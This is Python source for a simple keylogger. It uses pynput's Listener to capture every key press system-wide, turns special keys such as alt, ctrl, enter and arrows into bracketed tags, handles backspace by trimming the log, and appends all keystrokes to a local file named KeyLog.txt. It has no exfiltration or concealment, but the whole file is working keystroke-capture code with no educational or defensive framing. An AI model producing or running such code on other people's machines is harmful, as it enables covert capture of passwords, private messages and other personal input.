
from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")
    # Need to set up handlers for non-character keys
    # There are a few of them...

    if letter == 'Key.space':
        letter = " "

    if letter == 'Key.alt':
        letter = " [alt] "

    if letter == 'Key.alt_gr':
        letter = " [alt] "

    if letter == 'Key.alt_l':
        letter = " [alt] "

    if letter == 'Key.alt_r':
        letter = " [alt] "

    if letter == 'Key.backspace':
        with open('KeyLog.txt', mode='r') as rf:
            te = rf.read()
            te = te[:-1]
            with open('KeyLog.txt', mode='w') as bf:
                bf.write(te)
        letter = ""

    if letter == 'Key.caps_lock':
        letter = " [CAPS] "

    if letter == 'Key.cmd':
        letter = " [cmd] "

    if letter == 'Key.cmd_l':
        letter = " [cmd] "

    if letter == 'Key.cmd_r':
        letter = " [cmd] "

    if letter == 'Key.ctrl_l':
        letter = " [ctrl] "

    if letter == 'Key.ctrl_r':
        letter = " [ctrl] "

    if letter == 'Key.delete':
        letter = "[delete] "

    if letter == 'Key.down':
        letter = " [down] "

    if letter == 'Key.end':
        letter = " [end] "

    if letter == 'Key.enter':
        letter = "\n"

    if letter == 'Key.esc':
        letter = " [esc] "

    if letter == 'Key.f1':
        letter = " [F1] "

    if letter == 'Key.home':
        letter = " [home] "

    if letter == 'Key.insert':
        letter = " [ins] "

    if letter == 'Key.left':
        letter = " [left] "

    if letter == 'Key.menu':
        letter = " [menu] "

    if letter == 'Key.num_lock':
        letter = " [num_lock] "

    if letter == 'Key.page_down':
        letter = " [page_down] "

    if letter == 'Key.page_up':
        letter = " [page_up] "

    if letter == 'Key.pause':
        letter = " [pause] "

    if letter == 'Key.print_screen':
        letter = " [print_screen] "

    if letter == 'Key.right':
        letter = " [right] "

    if letter == 'Key.scroll_lock':
        letter = " [scroll_lock] "

    if letter == 'Key.shift':
        letter = ""

    if letter == 'Key.shift_l':
        letter = ""

    if letter == 'Key.shift_r':
        letter = ""

    if letter == 'Key.tab':
        letter = "    "
    if letter == 'Key.up':
        letter = " [up] "


    with open('KeyLog.txt', mode='a') as f:
        f.write(letter)


with Listener(on_press=write_to_file) as l:
    l.join()
